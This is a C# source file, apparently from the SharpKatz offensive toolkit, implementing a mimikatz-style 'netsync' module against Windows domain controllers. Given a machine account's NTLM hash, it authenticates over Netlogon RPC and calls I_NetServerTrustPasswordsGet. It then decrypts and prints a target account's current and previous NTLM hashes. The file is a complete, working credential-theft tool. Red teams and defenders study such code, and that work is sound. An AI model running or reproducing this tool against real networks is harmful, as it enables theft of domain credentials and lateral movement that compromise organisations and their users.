//
// Author: Johto
// Project: SharpKatz
// License: BSD 3-Clause
//
// lsadump::netsync — Netlogon password sync
// Authenticates to a DC using machine account NTLM hash,
// then retrieves target account's current and previous NTLM hashes
// via I_NetServerTrustPasswordsGet (opnum 42).
//
// Mimikatz equivalent: lsadump::netsync /dc:<dc> /user:<dc$> /ntlm:<hash> /account:<target$>
//

using SharpKatz.Win32;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class NetSync
    {
        // Netlogon secure channel types to try (same order as mimikatz)
        static readonly NETLOGON_SECURE_CHANNEL_TYPE[] ChannelTypes = new NETLOGON_SECURE_CHANNEL_TYPE[]
        {
            NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
            NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            NETLOGON_SECURE_CHANNEL_TYPE.TrustedDnsDomainSecureChannel,
            NETLOGON_SECURE_CHANNEL_TYPE.CdcServerSecureChannel
        };

        // MIDL proc + type format strings — reuse Zerologon's Netlogon interface definition
        // which already includes opnum 42 (I_NetServerTrustPasswordsGet) at offset 222
        static byte[] netlogonMIDLProcFormatString = new byte[] {
            0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x28, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x3c, 0x00, 0x44, 0x00, 0x46, 0x05, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x0b, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x10, 0x00, 0x14, 0x00, 0x12, 0x21, 0x18, 0x00, 0x14, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48,
            0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x40, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x5e, 0x00, 0x60, 0x00, 0x46, 0x08, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
            0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20, 0x00, 0x14, 0x00, 0x12, 0x21, 0x28, 0x00,
            0x14, 0x00, 0x58, 0x01, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48,
            0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x40, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x8e, 0x02,
            0x58, 0x00, 0x46, 0x08, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00,
            0x0b, 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20, 0x00, 0x2a, 0x00, 0x12, 0x41, 0x28, 0x00, 0x2a, 0x00, 0x0a, 0x01, 0x30, 0x00, 0x42, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48,
            0x00, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x48, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x56, 0x00, 0x40, 0x01, 0x46, 0x09, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
            0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20, 0x00, 0x2a, 0x00, 0x12, 0x41, 0x28, 0x00,
            0x2a, 0x00, 0x12, 0x41, 0x30, 0x00, 0x5a, 0x00, 0x12, 0x41, 0x38, 0x00, 0x5a, 0x00, 0x70, 0x00, 0x40, 0x00, 0x08, 0x00, 0x00,
        };

        static byte[] netlogonMIDLTypeFormatString = new byte[] {
            0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x08, 0x25, 0x5c, 0x11, 0x00, 0x08, 0x00, 0x1d, 0x00, 0x08, 0x00, 0x02, 0x5b, 0x15, 0x00, 0x08, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x11, 0x04,
            0xf4, 0xff, 0x11, 0x08, 0x08, 0x5c, 0x11, 0x00, 0x02, 0x00, 0x15, 0x03, 0x0c, 0x00, 0x4c, 0x00, 0xe4, 0xff, 0x08, 0x5b, 0x11, 0x04, 0xf4, 0xff, 0x11, 0x00, 0x08, 0x00, 0x1d, 0x01, 0x00, 0x02,
            0x05, 0x5b, 0x15, 0x03, 0x04, 0x02, 0x4c, 0x00, 0xf4, 0xff, 0x08, 0x5b, 0x11, 0x04, 0x0c, 0x00, 0x1d, 0x00, 0x10, 0x00, 0x4c, 0x00, 0xbe, 0xff, 0x5c, 0x5b, 0x15, 0x00, 0x10, 0x00, 0x4c, 0x00,
            0xf0, 0xff, 0x5c, 0x5b, 0x00,
        };

        static GCHandle procString;
        static GCHandle formatString;
        static GCHandle stub;
        static GCHandle faultoffsets;
        static GCHandle genericRuotinePair;
        static IntPtr rpcConn;
        static IntPtr hLogon;

        static AllocMemoryFunctionDelegate allocMemoryFunctionDelegate;
        private delegate IntPtr AllocMemoryFunctionDelegate(int memsize);

        static FreeMemoryFunctionDelegate freeMemoryFunctionDelegate;
        private delegate void FreeMemoryFunctionDelegate(IntPtr memory);

        private static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        private static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        static LogonSrvHandleBindFunctionDelegate logonSrvHandleBindFunctionDelegate;
        private delegate IntPtr LogonSrvHandleBindFunctionDelegate(IntPtr name);

        static LogonSrvHandleUnBindFunctionDelegate logonSrvHandleUnBindFunctionDelegate;
        private delegate void LogonSrvHandleUnBindFunctionDelegate(IntPtr name, IntPtr hLogon);

        private static IntPtr LogonSrvHandleBind(IntPtr name)
        {
            return rpcConn;
        }

        private static void LogonSrvHandleUnBind(IntPtr name, IntPtr hLogon)
        {
        }

        /// <summary>
        /// NlComputeCredentials — compute Netlogon credential from challenge using session key.
        /// Two rounds of DES encryption: DES(input[0..7], key[0..6]) -> intermediate,
        /// then DES(intermediate, key[7..13]) -> output.
        /// Uses ECB mode with 7-byte key expansion to 8-byte DES key.
        /// </summary>
        private static void NlComputeCredentials(byte[] input, byte[] output, byte[] sessionKey)
        {
            byte[] desKey1 = ExpandDESKey(sessionKey, 0);
            byte[] desKey2 = ExpandDESKey(sessionKey, 7);

            byte[] intermediate = DESEncryptBlock(input, desKey1);
            byte[] result = DESEncryptBlock(intermediate, desKey2);
            Array.Copy(result, 0, output, 0, 8);
        }

        /// <summary>
        /// Expand 7 bytes to 8-byte DES key with parity bits.
        /// </summary>
        private static byte[] ExpandDESKey(byte[] key, int offset)
        {
            byte[] expanded = new byte[8];
            expanded[0] = (byte)(key[offset + 0] >> 1);
            expanded[1] = (byte)(((key[offset + 0] & 0x01) << 6) | (key[offset + 1] >> 2));
            expanded[2] = (byte)(((key[offset + 1] & 0x03) << 5) | (key[offset + 2] >> 3));
            expanded[3] = (byte)(((key[offset + 2] & 0x07) << 4) | (key[offset + 3] >> 4));
            expanded[4] = (byte)(((key[offset + 3] & 0x0F) << 3) | (key[offset + 4] >> 5));
            expanded[5] = (byte)(((key[offset + 4] & 0x1F) << 2) | (key[offset + 5] >> 6));
            expanded[6] = (byte)(((key[offset + 5] & 0x3F) << 1) | (key[offset + 6] >> 7));
            expanded[7] = (byte)(key[offset + 6] & 0x7F);

            for (int i = 0; i < 8; i++)
                expanded[i] = (byte)((expanded[i] << 1) & 0xFE);

            return expanded;
        }

        /// <summary>
        /// Single-block DES ECB encryption.
        /// </summary>
        private static byte[] DESEncryptBlock(byte[] data, byte[] key)
        {
            using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.ECB;
                des.Padding = PaddingMode.None;
                des.Key = key;
                using (var enc = des.CreateEncryptor())
                {
                    byte[] result = new byte[8];
                    enc.TransformBlock(data, 0, 8, result, 0);
                    return result;
                }
            }
        }

        /// <summary>
        /// Compute Netlogon session key: HMAC-MD5(ntlmHash, MD5(0x00000000 + clientChallenge + serverChallenge))
        /// </summary>
        private static byte[] ComputeSessionKey(byte[] ntlmHash, byte[] clientChallenge, byte[] serverChallenge)
        {
            byte[] md5Input = new byte[4 + 8 + 8]; // zeros(4) + client(8) + server(8)
            // First 4 bytes are zero (already initialized)
            Array.Copy(clientChallenge, 0, md5Input, 4, 8);
            Array.Copy(serverChallenge, 0, md5Input, 12, 8);

            byte[] md5Hash;
            using (MD5 md5 = MD5.Create())
            {
                md5Hash = md5.ComputeHash(md5Input);
            }

            using (HMACMD5 hmac = new HMACMD5(ntlmHash))
            {
                return hmac.ComputeHash(md5Hash);
            }
        }

        /// <summary>
        /// Decrypt ENCRYPTED_NT_OWF_PASSWORD using session key.
        /// DES-ECB decrypt: DES(encrypted[0..7], sessionKey[0..6]) + DES(encrypted[8..15], sessionKey[7..13])
        /// </summary>
        private static byte[] DecryptNtOwfPassword(byte[] encrypted, byte[] sessionKey)
        {
            byte[] desKey1 = ExpandDESKey(sessionKey, 0);
            byte[] desKey2 = ExpandDESKey(sessionKey, 7);

            byte[] result = new byte[16];

            using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.ECB;
                des.Padding = PaddingMode.None;

                des.Key = desKey1;
                using (var dec = des.CreateDecryptor())
                {
                    dec.TransformBlock(encrypted, 0, 8, result, 0);
                }

                des.Key = desKey2;
                using (var dec = des.CreateDecryptor())
                {
                    dec.TransformBlock(encrypted, 8, 8, result, 8);
                }
            }

            return result;
        }

        /// <summary>
        /// Compute authenticator for Netlogon secure channel.
        /// Increments credential by timestamp, then computes new credential.
        /// </summary>
        private static NETLOGON_AUTHENTICATOR ComputeAuthenticator(ref byte[] credential, byte[] sessionKey)
        {
            // Use fixed timestamp 0x10 (same as mimikatz)
            uint timestamp = 0x10;

            // Increment credential value by timestamp
            ulong credVal = BitConverter.ToUInt64(credential, 0);
            credVal += timestamp;
            byte[] updatedCred = BitConverter.GetBytes(credVal);
            Array.Copy(updatedCred, credential, 8);

            // Compute authenticator credential
            byte[] authCred = new byte[8];
            NlComputeCredentials(credential, authCred, sessionKey);

            NETLOGON_AUTHENTICATOR auth = new NETLOGON_AUTHENTICATOR();
            auth.Credential = new NETLOGON_CREDENTIAL();
            auth.Credential.data = authCred;
            auth.Timestamp = timestamp;

            return auth;
        }

        /// <summary>
        /// Convert hex string to byte array.
        /// </summary>
        private static byte[] HexToBytes(string hex)
        {
            if (hex.Length % 2 != 0)
                return null;

            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        /// <summary>
        /// Format byte array as hex string.
        /// </summary>
        private static string BytesToHex(byte[] bytes)
        {
            return BitConverter.ToString(bytes).Replace("-", "").ToLowerInvariant();
        }

        public static void RunNetSync(string dc, string user, string ntlmHex, string account)
        {
            Console.WriteLine();
            Console.WriteLine("   [*] NetSync: DC={0}, User={1}, Account={2}", dc, user, account);

            // Parse NTLM hash
            byte[] ntlmHash = HexToBytes(ntlmHex);
            if (ntlmHash == null || ntlmHash.Length != 16)
            {
                Console.WriteLine("   [-] NTLM hash must be 32 hex characters (16 bytes)");
                return;
            }

            // Create RPC binding to DC
            rpcConn = DCSync.CreateBinding(dc, null, DCSync.RPC_C_AUTHN_NONE);
            if (rpcConn == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Error creating RPC binding to {0}", dc);
                return;
            }

            NTSTATUS rpcStatus = (NTSTATUS)RpcEpResolveBinding(rpcConn, GetClientInterface());
            if (rpcStatus != NTSTATUS.Success)
            {
                Console.WriteLine("   [-] Error RpcEpResolveBinding: 0x{0:X8}", (int)rpcStatus);
                return;
            }

            // Step 1: NetrServerReqChallenge
            byte[] clientChallengeBytes = new byte[] { 0x2D, 0x5C, 0x7C, 0x2F, 0x2D, 0x5C, 0x7C, 0x2F }; // '-\|/-\|/' same as mimikatz

            NETLOGON_CREDENTIAL clientChallenge = new NETLOGON_CREDENTIAL();
            clientChallenge.data = (byte[])clientChallengeBytes.Clone();

            IntPtr pClientChallenge = Marshal.AllocHGlobal(Marshal.SizeOf(clientChallenge));
            Marshal.StructureToPtr(clientChallenge, pClientChallenge, false);

            // ComputerName used for the secure channel — just a label, not critical
            string computerName = "SHARPKATZ";
            IntPtr computerNamePtr = Marshal.StringToHGlobalUni(computerName);

            NETLOGON_CREDENTIAL serverChallenge;

            uint status = NetrServerReqChallenge(GetStubPtr(), GetProcStringPtr(0), IntPtr.Zero, computerNamePtr, pClientChallenge, out serverChallenge);
            if ((int)status < 0)
            {
                Console.WriteLine("   [-] NetrServerReqChallenge failed: 0x{0:X8}", status);
                Cleanup(computerNamePtr, pClientChallenge);
                return;
            }

            // Step 2: Compute session key
            byte[] sessionKey = ComputeSessionKey(ntlmHash, clientChallengeBytes, serverChallenge.data);

            // Step 3: Compute client and candidate server credentials
            byte[] clientCredentialBytes = new byte[8];
            byte[] candidateServerCredentialBytes = new byte[8];
            NlComputeCredentials(clientChallengeBytes, clientCredentialBytes, sessionKey);
            NlComputeCredentials(serverChallenge.data, candidateServerCredentialBytes, sessionKey);

            // Step 4: NetrServerAuthenticate2 (opnum 15)
            NETLOGON_CREDENTIAL clientCredential = new NETLOGON_CREDENTIAL();
            clientCredential.data = clientCredentialBytes;

            IntPtr pClientCred = Marshal.AllocHGlobal(Marshal.SizeOf(clientCredential));
            Marshal.StructureToPtr(clientCredential, pClientCred, false);

            IntPtr userPtr = Marshal.StringToHGlobalUni(user);

            uint negotiateFlags = 0x600FFFFF;
            NETLOGON_CREDENTIAL serverCredential;
            uint accountRid;

            status = NetrServerAuthenticate3(GetStubPtr(), GetProcStringPtr(62), IntPtr.Zero,
                userPtr, NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, computerNamePtr,
                pClientCred, out serverCredential, out negotiateFlags, out accountRid);

            if ((int)status < 0)
            {
                Console.WriteLine("   [-] NetrServerAuthenticate failed: 0x{0:X8}", status);
                Cleanup(computerNamePtr, pClientChallenge, userPtr, pClientCred);
                return;
            }

            // Step 5: Verify server credential
            if (!ArrayEqual(candidateServerCredentialBytes, serverCredential.data))
            {
                Console.WriteLine("   [-] Server credential verification failed — session key mismatch");
                Cleanup(computerNamePtr, pClientChallenge, userPtr, pClientCred);
                return;
            }

            Console.WriteLine("   [+] Secure channel established");

            // Step 6: I_NetServerTrustPasswordsGet — try each secure channel type
            IntPtr accountPtr = Marshal.StringToHGlobalUni(account);

            // Working copy of credential for authenticator computation
            byte[] workingCredential = (byte[])clientCredentialBytes.Clone();

            bool found = false;
            for (int i = 0; i < ChannelTypes.Length && !found; i++)
            {
                NETLOGON_AUTHENTICATOR clientAuth = ComputeAuthenticator(ref workingCredential, sessionKey);

                IntPtr pClientAuth = Marshal.AllocHGlobal(Marshal.SizeOf(clientAuth));
                Marshal.StructureToPtr(clientAuth, pClientAuth, false);

                IntPtr pReturnAuth = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NETLOGON_AUTHENTICATOR)));

                // ENCRYPTED_NT_OWF_PASSWORD = 16 bytes
                IntPtr pEncNewOwf = Marshal.AllocHGlobal(16);
                IntPtr pEncOldOwf = Marshal.AllocHGlobal(16);

                status = Natives.NetServerTrustPasswordsGet(GetStubPtr(), GetProcStringPtr(222),
                    IntPtr.Zero, accountPtr, ChannelTypes[i], computerNamePtr,
                    pClientAuth, pReturnAuth, pEncNewOwf, pEncOldOwf);

                if ((int)status >= 0)
                {
                    found = true;

                    // Read encrypted passwords
                    byte[] encNewOwf = new byte[16];
                    byte[] encOldOwf = new byte[16];
                    Marshal.Copy(pEncNewOwf, encNewOwf, 0, 16);
                    Marshal.Copy(pEncOldOwf, encOldOwf, 0, 16);

                    // Decrypt using session key
                    byte[] newNtlm = DecryptNtOwfPassword(encNewOwf, sessionKey);
                    byte[] oldNtlm = DecryptNtOwfPassword(encOldOwf, sessionKey);

                    Console.WriteLine("   Account: {0}", account);
                    Console.WriteLine("   NTLM   : {0}", BytesToHex(newNtlm));
                    Console.WriteLine("   NTLM-1 : {0}", BytesToHex(oldNtlm));
                }
                else if (status != 0xC0000225) // STATUS_NO_SUCH_USER
                {
                    // Non-retryable error
                    Console.WriteLine("   [-] I_NetServerTrustPasswordsGet failed: 0x{0:X8} (channel type {1})", status, ChannelTypes[i]);
                }

                // Increment credential for next attempt (same as mimikatz: *(PDWORD64)Credential += 1)
                ulong credVal = BitConverter.ToUInt64(workingCredential, 0);
                credVal += 1;
                byte[] updated = BitConverter.GetBytes(credVal);
                Array.Copy(updated, workingCredential, 8);

                Marshal.FreeHGlobal(pClientAuth);
                Marshal.FreeHGlobal(pReturnAuth);
                Marshal.FreeHGlobal(pEncNewOwf);
                Marshal.FreeHGlobal(pEncOldOwf);
            }

            if (!found)
            {
                Console.WriteLine("   [-] Could not retrieve password for account {0}", account);
                Console.WriteLine("   [-] Account may not exist or secure channel type mismatch");
            }

            // Cleanup
            Cleanup(computerNamePtr, pClientChallenge, userPtr, pClientCred, accountPtr);
        }

        private static bool ArrayEqual(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            for (int i = 0; i < a.Length; i++)
                if (a[i] != b[i]) return false;
            return true;
        }

        private static void Cleanup(params IntPtr[] ptrs)
        {
            foreach (var p in ptrs)
            {
                if (p != IntPtr.Zero)
                    Marshal.FreeHGlobal(p);
            }
        }

        private static IntPtr GetClientInterface()
        {
            RPC_VERSION rpcv1 = new RPC_VERSION { MajorVersion = 1, MinorVersion = 0 };
            RPC_VERSION rpcv2 = new RPC_VERSION { MajorVersion = 2, MinorVersion = 0 };

            RPC_SYNTAX_IDENTIFIER InterfaceId = new RPC_SYNTAX_IDENTIFIER
            {
                SyntaxGUID = new Guid(0x12345678, 0x1234, 0xabcd, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0xcf, 0xfb),
                SyntaxVersion = rpcv1
            };

            RPC_SYNTAX_IDENTIFIER TransferSyntax = new RPC_SYNTAX_IDENTIFIER
            {
                SyntaxGUID = new Guid(0x8a885d04, 0x1ceb, 0x11c9, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60),
                SyntaxVersion = rpcv2
            };

            RPC_CLIENT_INTERFACE logonRpcClientInterface = new RPC_CLIENT_INTERFACE
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)),
                InterfaceId = InterfaceId,
                TransferSyntax = TransferSyntax,
                DispatchTable = IntPtr.Zero,
                RpcProtseqEndpointCount = 0,
                RpcProtseqEndpoint = IntPtr.Zero,
                Reserved = IntPtr.Zero,
                InterpreterInfo = IntPtr.Zero,
                Flags = 0x00000000
            };

            IntPtr plogonRpcClientInterface = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)));
            Marshal.StructureToPtr(logonRpcClientInterface, plogonRpcClientInterface, false);

            return plogonRpcClientInterface;
        }

        private static IntPtr GetStubPtr()
        {
            if (!stub.IsAllocated)
            {
                procString = GCHandle.Alloc(netlogonMIDLProcFormatString, GCHandleType.Pinned);

                COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS
                {
                    CommOffset = -1,
                    FaultOffset = -1
                };

                faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
                formatString = GCHandle.Alloc(netlogonMIDLTypeFormatString, GCHandleType.Pinned);

                allocMemoryFunctionDelegate = AllocateMemory;
                freeMemoryFunctionDelegate = FreeMemory;
                IntPtr pAllocMemory = Marshal.GetFunctionPointerForDelegate(allocMemoryFunctionDelegate);
                IntPtr pFreeMemory = Marshal.GetFunctionPointerForDelegate(freeMemoryFunctionDelegate);

                logonSrvHandleBindFunctionDelegate = LogonSrvHandleBind;
                logonSrvHandleUnBindFunctionDelegate = LogonSrvHandleUnBind;
                IntPtr pLogonSrvHandleBind = Marshal.GetFunctionPointerForDelegate(logonSrvHandleBindFunctionDelegate);
                IntPtr pLogonSrvHandleUnBind = Marshal.GetFunctionPointerForDelegate(logonSrvHandleUnBindFunctionDelegate);

                GENERIC_BINDING_ROUTINE_PAIR rp = new GENERIC_BINDING_ROUTINE_PAIR();
                rp.Bind = pLogonSrvHandleBind;
                rp.Unbind = pLogonSrvHandleUnBind;

                genericRuotinePair = GCHandle.Alloc(rp, GCHandleType.Pinned);

                hLogon = IntPtr.Zero;

                MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC
                {
                    RpcInterfaceInformation = GetClientInterface(),
                    pfnAllocate = pAllocMemory,
                    pfnFree = pFreeMemory,
                    pAutoBindHandle = hLogon,
                    apfnNdrRundownRoutines = IntPtr.Zero,
                    aGenericBindingRoutinePairs = genericRuotinePair.AddrOfPinnedObject(),
                    apfnExprEval = IntPtr.Zero,
                    aXmitQuintuple = IntPtr.Zero,
                    pFormatTypes = formatString.AddrOfPinnedObject(),
                    fCheckBounds = 1,
                    Version = 0x60000,
                    pMallocFreeStruct = IntPtr.Zero,
                    MIDLVersion = 0x8000253,
                    CommFaultOffsets = IntPtr.Zero,
                    aUserMarshalQuadruple = IntPtr.Zero,
                    NotifyRoutineTable = IntPtr.Zero,
                    mFlags = new IntPtr(0x00000001),
                    CsRoutineTables = IntPtr.Zero,
                    ProxyServerInfo = IntPtr.Zero,
                    pExprInfo = IntPtr.Zero,
                };

                stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            }

            return stub.AddrOfPinnedObject();
        }

        private static IntPtr GetProcStringPtr(int index)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(netlogonMIDLProcFormatString, index);
        }
    }
}
